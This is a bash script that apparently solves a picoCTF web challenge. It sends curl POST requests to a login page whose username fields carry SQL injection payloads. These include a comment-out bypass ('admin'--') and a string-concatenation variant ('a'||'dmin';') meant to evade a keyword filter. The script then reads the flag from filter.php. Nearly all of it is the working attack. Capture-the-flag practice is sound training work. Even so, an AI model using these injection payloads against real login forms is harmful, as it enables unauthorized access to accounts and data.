# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null


webLink=$1

curl "$webLink" \
     --silent \
     --cookie-jar cookies > /dev/null

curl "$webLink""index.php" \
     --data-raw 'user=admin%27--&pass=123' \
     --silent \
     --cookie cookies \
     --cookie-jar cookies > /dev/null

curl "$webLink""index.php" \
     --data-raw 'user=admin%27%3B&pass=123' \
     --silent \
     --cookie cookies \
     --cookie-jar cookies > /dev/null

curl "$webLink""index.php" \
     --data-raw 'user=admin%27%3B&pass=123' \
     --silent \
     --cookie cookies \
     --cookie-jar cookies > /dev/null

curl "$webLink""index.php" \
     --data-raw 'user=a%27%7C%7C%27dmin%27%3B&pass=123' \
     --silent \
     --cookie cookies \
     --cookie-jar cookies > /dev/null

curl "$webLink""index.php" \
     --data-raw 'user=a%27%7C%7C%27dmin%27%3B&pass=123' \
     --silent \
     --cookie cookies \
     --cookie-jar cookies > /dev/null

response=$(curl "$webLink""filter.php" \
                --silent \
                --cookie-jar cookies \
                --cookie cookies)

flag=$(echo "$response" | grep -o --no-filename picoCTF{.*})

popd > /dev/null

# print the flag
echo $flag
